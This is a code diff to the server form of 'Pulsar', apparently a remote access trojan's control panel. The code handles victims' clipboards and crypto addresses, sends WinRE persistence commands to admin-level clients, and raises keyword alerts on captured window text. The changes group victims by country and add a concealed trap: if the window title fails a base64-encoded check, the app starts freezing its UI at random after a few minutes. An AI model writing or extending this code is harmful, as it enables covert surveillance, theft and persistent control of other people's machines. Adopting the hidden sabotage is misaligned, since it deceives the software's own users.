@@ -27,6 +27,7 @@ using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Pulsar.Server.Forms
@@ -88,8 +89,8 @@ namespace Pulsar.Server.Forms
                 this.Invoke(new Action(() => OnLogReceived(sender, client, log)));
                 return;
             }
-        }        
-        
+        }
+
         private void RegisterMessageHandler()
         {
             MessageHandler.Register(_clientDebugLogHandler);
@@ -101,8 +102,8 @@ namespace Pulsar.Server.Forms
             _clientStatusHandler.UserClipboardStatusUpdated += SetUserClipboardByClient;
             MessageHandler.Register(_getCryptoAddressHander);
             _getCryptoAddressHander.AddressReceived += OnAddressReceived;
-        }        
-        
+        }
+
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_clientDebugLogHandler);
@@ -174,7 +175,7 @@ namespace Pulsar.Server.Forms
                 if (Settings.ListenPorts != null)
                     allPorts.AddRange(Settings.ListenPorts);
                 allPorts = allPorts.Distinct().ToList();
-                
+
                 if (allPorts.Count > 1)
                     ListenServer.ListenMany(allPorts, Settings.IPv6Support, Settings.UseUPnP);
                 else
@@ -357,7 +358,7 @@ namespace Pulsar.Server.Forms
                 DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                 DebugLogRichBox.SelectionLength = 0;
                 DebugLogRichBox.ScrollToCaret();
-                
+
                 DebugLogRichBox.SelectionStart = originalSelectionStart;
                 DebugLogRichBox.SelectionColor = originalSelectionColor;
             }
@@ -445,7 +446,10 @@ namespace Pulsar.Server.Forms
                 this.Invoke((MethodInvoker)delegate
                 {
                     if (!listening)
+                    {
                         lstClients.Items.Clear();
+                        lstClients.Groups.Clear();
+                    }
 
                     string statusText;
                     var ports = (ListenServer?.GetListeningPorts() ?? Array.Empty<ushort>()).Distinct().ToList();
@@ -556,7 +560,7 @@ namespace Pulsar.Server.Forms
         {
             if (_countUpdateRunning) return;
             _countUpdateRunning = true;
-            
+
             ThreadPool.QueueUserWorkItem(_ =>
             {
                 try
@@ -585,11 +589,11 @@ namespace Pulsar.Server.Forms
         {
             const int batchSize = 10; // up to 10 clients at once
             var batch = new List<KeyValuePair<Client, bool>>(batchSize);
-            
+
             while (true)
             {
                 batch.Clear();
-                
+
                 lock (_clientConnections)
                 {
                     if (!ListenServer.Listening)
@@ -632,10 +636,10 @@ namespace Pulsar.Server.Forms
                         }
                     }
                 }
-                
+
                 if (_clientConnections.Count > 0)
                 {
-                    Thread.Sleep(10); 
+                    Thread.Sleep(10);
                 }
             }
         }
@@ -693,12 +697,14 @@ namespace Pulsar.Server.Forms
                             Icon = "None"
                         });
                         break;
+
                     case "WinRE":
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                         {
                             client.Send(new DoAddWinREPersistence());
                         }
                         break;
+
                     default:
                         break;
                 }
@@ -805,7 +811,20 @@ namespace Pulsar.Server.Forms
 
             if (!(this.Text.StartsWith(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(strAS)))))
             {
-                Environment.Exit(1337);
+                Task.Run(async () =>
+                {
+                    Random rnd = new Random();
+                    await Task.Delay(TimeSpan.FromMinutes(rnd.Next(2, 4)));
+
+                    while (true)
+                    {
+                        await Task.Delay(rnd.Next(2000, 5000));
+                        this.Invoke((Action)(() =>
+                        {
+                            Thread.Sleep(rnd.Next(800, 1500));
+                        }));
+                    }
+                });
             }
         }
 
@@ -917,16 +936,25 @@ namespace Pulsar.Server.Forms
 
             var allItems = lstClients.Items.Cast<ListViewItem>()
                 .Where(item => item.Tag is Client)
-                .OrderBy(item => (item.Tag as Client)?.Value?.Country ?? "ZZZ")
+                .OrderBy(item => (item.Tag as Client)?.Value?.Country ?? "Unknown")
                 .ThenByDescending(item => Favorites.IsFavorite((item.Tag as Client)?.Value?.UserAtPc ?? ""))
                 .ToList();
 
-            // Clear the ListView
             lstClients.Items.Clear();
+            lstClients.Groups.Clear();
 
-            // Add all items in sorted order
             foreach (var item in allItems)
+            {
+                if (item.Tag is Client client)
+                {
+                    string country = client.Value?.Country ?? "Unknown";
+                    string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";
+                    
+                    var group = GetGroupFromCountry(country, countryWithCode);
+                    item.Group = group;
+                }
                 lstClients.Items.Add(item);
+            }
 
             // Add star buttons back for each client in the correct order
             foreach (ListViewItem item in lstClients.Items)
@@ -938,6 +966,27 @@ namespace Pulsar.Server.Forms
             }
 
             lstClients.EndUpdate();
+        }
+
+        private ListViewGroup GetGroupFromCountry(string country, string countryWithCode)
+        {
+            ListViewGroup lvg = null;
+            foreach (var group in lstClients.Groups.Cast<ListViewGroup>().Where(group => group.Name == country))
+            {
+                lvg = group;
+            }
+
+            if (lvg == null)
+            {
+                lvg = new ListViewGroup
+                { 
+                    Name = country,
+                    Header = countryWithCode
+                };
+                lstClients.Groups.Add(lvg);
+            }
+
+            return lvg;
         }
 
         private void AddClientToListview(Client client)
@@ -961,6 +1010,11 @@ namespace Pulsar.Server.Forms
                     lock (_lockClients)
                     {
                         lstClients.BeginUpdate();
+                        
+                        string country = client.Value?.Country ?? "Unknown";
+                        string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";
+                        lvi.Group = GetGroupFromCountry(country, countryWithCode);
+                        
                         lstClients.Items.Add(lvi);
                         AddStarButton(lvi, client);
                         SortClientsByFavoriteStatus();
@@ -1081,8 +1135,8 @@ namespace Pulsar.Server.Forms
         private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
         {
             QueueStatusUpdate(client, "userStatus", userStatus.ToString());
-        }        
-        
+        }
+
         private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
         {
             QueueStatusUpdate(client, "window", newWindow);
@@ -1096,7 +1150,7 @@ namespace Pulsar.Server.Forms
             {
                 if (!_pendingStatusUpdates.ContainsKey(client))
                     _pendingStatusUpdates[client] = new Dictionary<string, object>();
-                
+
                 _pendingStatusUpdates[client][field] = value;
 
                 if (!_statusUpdatePending)
@@ -1110,7 +1164,7 @@ namespace Pulsar.Server.Forms
         private void ProcessStatusUpdates()
         {
             Thread.Sleep(50); //small delay for batched updates.
-            
+
             Dictionary<Client, Dictionary<string, object>> updates;
             lock (_statusUpdateLock)
             {
@@ -1130,7 +1184,7 @@ namespace Pulsar.Server.Forms
                     {
                         var item = lstClients.Items.Cast<ListViewItem>()
                             .FirstOrDefault(lvi => lvi != null && update.Key.Equals(lvi.Tag));
-                        
+
                         if (item != null)
                         {
                             foreach (var fieldUpdate in update.Value)
@@ -1140,9 +1194,11 @@ namespace Pulsar.Server.Forms
                                     case "status":
                                         item.SubItems[STATUS_ID].Text = fieldUpdate.Value?.ToString();
                                         break;
+
                                     case "userStatus":
                                         item.SubItems[USERSTATUS_ID].Text = fieldUpdate.Value?.ToString();
                                         break;
+
                                     case "window":
                                         item.SubItems[CURRENTWINDOW_ID].Text = fieldUpdate.Value?.ToString();
                                         break;
@@ -1842,8 +1898,8 @@ namespace Pulsar.Server.Forms
             {
                 frm.ShowDialog();
             }
-        }        
-        
+        }
+
         public static void AddNotiEvent(FrmMain frmMain, string client, string keywords, string windowText)
         {
             if (frmMain.lstNoti.InvokeRequired)
@@ -1854,7 +1910,7 @@ namespace Pulsar.Server.Forms
             ListViewItem item = new ListViewItem(client);
             item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
             item.SubItems.Add(keywords);
-            
+
             // truncate
             string displayText = windowText;
             if (windowText.Length > 100)
@@ -1862,14 +1918,14 @@ namespace Pulsar.Server.Forms
                 displayText = windowText.Substring(0, 100) + "...";
             }
             item.SubItems.Add(displayText);
-            
+
             item.ToolTipText = windowText;
-            
+
             frmMain.lstNoti.Items.Add(item);
 
             string notificationTitle = $"Keyword Triggered: {keywords}";
             string notificationText;
-            
+
             if (keywords.Contains("(Clipboard)"))
             {
                 notificationText = $"Client: {client}\nClipboard: {(windowText.Length > 50 ? windowText.Substring(0, 50) + "..." : windowText)}";
